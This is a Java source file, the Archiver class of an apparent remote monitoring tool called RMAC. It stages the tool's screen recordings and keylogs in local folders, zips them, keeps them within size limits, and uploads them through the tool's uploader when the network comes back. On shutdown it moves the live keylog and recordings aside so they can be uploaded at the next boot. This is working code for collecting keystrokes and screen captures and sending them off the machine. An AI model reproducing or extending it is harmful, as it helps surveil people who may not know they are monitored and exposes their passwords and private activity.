package com.rmac.core;

import com.rmac.Main;
import com.rmac.utils.ArchiveFileType;
import com.rmac.utils.Constants;
import com.rmac.utils.Utils;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.Arrays;
import java.util.stream.Stream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import lombok.extern.slf4j.Slf4j;

/**
 * When there is no internet connection, moves and archives different output files to a common
 * directory to be uploaded later when connectivity is established. <br/><br/> Different working
 * directories for specific files:<br/>
 * <b>/archives</b>           - The root working directory for staging/archiving<br/>
 * <b>/archives/screen</b>    - Staging directory to hold screen recordings<br/>
 * <b>/archives/key</b>       - Staging directory to hold keylogs<br/>
 * <b>/archives/other</b>     - Staging directory to hold all other files except the above<br/>
 * <b>/archives/pending</b>   - Directory to hold all generated zip archives of staging folders
 * (screen/key/other) that will be uploaded when network is up again<br/> <br/> Each archive staging
 * directory (screen/key/other) has a maximum directory size that can be configured, when size
 * reaches the limit, all the files under this staging directory gets zip archived and moved to
 * /archives/pending directory, from where the zip will be uploaded when network is up. <br/><br/>
 * The directory /archives/pending also has a configurable maximum size, when this size is reached,
 * older archives will be deleted to make space for new ones.<br/> This behaviour makes sure that
 * data collection won't fill up host machine's storage when network is down for a long time.
 */
@Slf4j
public class Archiver {

  public Archiver() {
    this.verifyFolders();
  }

  /**
   * Verify if correct working directories have been created in which files needs be archived and
   * placed, create them otherwise.
   */
  private void verifyFolders() {
    File archivesFolder = new File(Constants.ARCHIVES_LOCATION);
    File pendingFolder = new File(Constants.PENDING_ARCHIVES_LOCATION);
    File outArchiveFolder = new File(Constants.LOG_ARCHIVE_LOCATION);
    File screenArchiveFolder = new File(Constants.SCREEN_ARCHIVE_LOCATION);
    File otherArchiveFolder = new File(Constants.OTHER_ARCHIVE_LOCATION);
    if (!archivesFolder.exists()) {
      archivesFolder.mkdirs();
    }
    if (!pendingFolder.exists()) {
      pendingFolder.mkdirs();
    }
    if (!outArchiveFolder.exists()) {
      outArchiveFolder.mkdirs();
    }
    if (!screenArchiveFolder.exists()) {
      screenArchiveFolder.mkdirs();
    }
    if (!otherArchiveFolder.exists()) {
      otherArchiveFolder.mkdirs();
    }
  }

  /**
   * Move the given file to its corresponding staging directory, the staging directory is inferred
   * from <b>type</b>
   *
   * @param file The file to be archived.
   * @param type Type of this file, which helps to determine which staging directory this file will
   *             go to before being archived.
   */
  public synchronized void moveToArchive(String filePath, ArchiveFileType type) {
    String archiveLocation = this.getArchiveLocation(type);
    try {
      Path file = Paths.get(filePath);
      Main.fs.move(filePath, archiveLocation + "\\" + file.getFileName());
    } catch (IOException e) {
      log.error("Could not move file to staging", e);
    }
    long stagingSize = this.getDirectorySize(archiveLocation);
    if (stagingSize < Main.config.getMaxStagingSize()) {
      return;
    }
    log.warn("Staging full");
    long pendingSize = this.getDirectorySize(Constants.PENDING_ARCHIVES_LOCATION);
    if (pendingSize >= Main.config.getMaxStorageSize()) {
      log.warn("Storage size limit reached, deleting old files");
      this.deleteOldestFile(Constants.PENDING_ARCHIVES_LOCATION);
    }
    this.createNewArchive(archiveLocation, Constants.PENDING_ARCHIVES_LOCATION);
    log.warn("New archive created");
  }

  /**
   * Create archives of all three staging directories (screen/key/other) and place them in pending
   * directory (/archives/pending).
   * <br>
   * Upload all the archives from pending directory.
   * <br>
   * <br>
   * <cite>
   * Final archiving of staging directories and moving them to /archives/pending will only happen
   * when the configured maximum size for staging directories has been reached, this method is an
   * exception to this behaviour, which will archive all the staging directories even if their sizes
   * has not reached the configured size limit.
   * <br><br>
   * For e.g. this method is called when network status changes from down to up, assuming the
   * network was down for a good amount of time, the staging directories might contain files ready
   * to be uploaded.
   * <br>
   * But you don't want to wait until the staging size is full and an archive is made and placed in
   * /archives/pending to be uploaded, since the uploading only happens from /archives/pending and
   * not from the staging directories directly.
   * </cite>
   */
  public void uploadArchives() {
    File[] screenFiles = new File(Constants.SCREEN_ARCHIVE_LOCATION).listFiles();
    if (screenFiles != null && screenFiles.length > 0) {
      this.createNewArchive(Constants.SCREEN_ARCHIVE_LOCATION, Constants.PENDING_ARCHIVES_LOCATION);
    }
    File[] logFiles = new File(Constants.LOG_ARCHIVE_LOCATION).listFiles();
    if (logFiles != null && logFiles.length > 0) {
      this.createNewArchive(Constants.LOG_ARCHIVE_LOCATION, Constants.PENDING_ARCHIVES_LOCATION);
    }
    File[] otherFiles = new File(Constants.OTHER_ARCHIVE_LOCATION).listFiles();
    if (otherFiles != null && otherFiles.length > 0) {
      this.createNewArchive(Constants.OTHER_ARCHIVE_LOCATION, Constants.PENDING_ARCHIVES_LOCATION);
    }

    File[] pendingFiles = new File(Constants.PENDING_ARCHIVES_LOCATION).listFiles();
    if (pendingFiles != null && pendingFiles.length > 0) {
      for (File pendingFile : pendingFiles) {
        Main.uploader.uploadFile(pendingFile, ArchiveFileType.ARCHIVE);
      }
    }
  }

  /**
   * Move active screen-recording or key-logging or any other files to its respective staging
   * directory.
   * <br>
   * <br>
   * <cite>
   * This method is only called when RMAC is shutting down, when shutdown happens the screen
   * recording and key logging stops abruptly, since it cannot upload these active files at this
   * moment, the best option is to archive them to their respective staging directories as if there
   * was no internet connection.
   * <br>
   * <br>
   * RMAC can upload these files when it boots up the next time.
   * </cite>
   */
  public void cleanUp() {
    try {
      Main.fs
          .list(Constants.CURRENT_LOCATION)
          .filter(path -> path.getFileName().endsWith(".mkv"))
          .forEach(path -> Main.archiver.moveToArchive(
              path.toAbsolutePath().toString(), ArchiveFileType.SCREEN
          ));
    } catch (IOException e) {
      log.error("Could not list files in current directory", e);
    }

    String keyFilePath = Constants.TEMP_LOCATION + "\\Key-" + Utils.getTimestamp() + ".txt";
    try {
      Main.fs.move(Constants.KEYLOG_LOCATION, keyFilePath, StandardCopyOption.REPLACE_EXISTING);
      Main.archiver.moveToArchive(keyFilePath, ArchiveFileType.KEY);
    } catch (IOException e) {
      log.error("Could not move key file to temp", e);
    }
  }

  /**
   * Create a shallow zip archive of the <code>sourceFolder</code> and place the zip in
   * <code>destFolder</code>.
   *
   * @param sourceFolder The directory that needs to be archived.
   * @param destFolder   Destination directory in which the archive will be placed.
   */
  private void createNewArchive(String sourceFolder, String destFolder) {
    String zipPath =
        destFolder + "\\" + Utils.getTimestamp() + ".zip";
    File[] files = new File(sourceFolder).listFiles();

    if (files == null) {
      log.error("Could not list files in source folder");
      return;
    }

    boolean success = false;
    try (ZipOutputStream zipOut = new ZipOutputStream(Files.newOutputStream(Paths.get(zipPath)))) {
      for (File file : files) {
        zipOut.putNextEntry(new ZipEntry(file.getName()));
        Files.copy(file.toPath(), zipOut);
      }
      success = true;
    } catch (IOException e) {
      log.error("Could not zip source folder", e);
    } finally {
      if (success) {
        Arrays.stream(files).forEach(File::delete);
      }
    }
  }

  /**
   * Calculate the total size of all the files in the given directory.
   * <br><br>
   * <cite>
   * This is a shallow operation, only root level files are traversed.
   * </cite>
   *
   * @param dirPath The directory for which the total size needs to be calculated.
   * @return The size of the directory in bytes.
   */
  private long getDirectorySize(String dirPath) {
    long size = 0;
    try (Stream<Path> walk = Files.walk(Paths.get(dirPath))) {
      size = walk
          .filter(Files::isRegularFile)
          .mapToLong(this::getFileSize)
          .sum();

    } catch (IOException e) {
      log.error("Could not get directory size", e);
    }
    return size;
  }

  /**
   * Get the size of given <code>file</code> in bytes.
   *
   * @param path Path to the file.
   * @return Size of the file in bytes.
   */
  private long getFileSize(Path path) {
    try {
      return Files.size(path);
    } catch (IOException e) {
      log.error("Could not get file size", e);
      return 0L;
    }
  }

  /**
   * Traverse all the root level files in a given directory and delete the one which is oldest.
   *
   * @param dirPath Location of the directory.
   */
  private void deleteOldestFile(String dirPath) {
    File[] logFiles = new File(dirPath).listFiles();
    long oldestModified = Long.MAX_VALUE;
    File oldestFile = null;
    if (logFiles != null) {
      for (File f : logFiles) {
        if (f.lastModified() < oldestModified) {
          oldestModified = f.lastModified();
          oldestFile = f;
        }
      }

      if (oldestFile != null) {
        oldestFile.delete();
      }
    }
  }

  /**
   * Get the absolute path to the staging directory represented by <code>type</code>
   *
   * @param type Type of the staging directory.
   * @return The absolute path of the staging directory.
   */
  private String getArchiveLocation(ArchiveFileType type) {
    if (type == ArchiveFileType.SCREEN) {
      return Constants.SCREEN_ARCHIVE_LOCATION;
    }
    if (type == ArchiveFileType.KEY) {
      return Constants.LOG_ARCHIVE_LOCATION;
    }
    if (type == ArchiveFileType.OTHER) {
      return Constants.OTHER_ARCHIVE_LOCATION;
    }
    return null;
  }
}
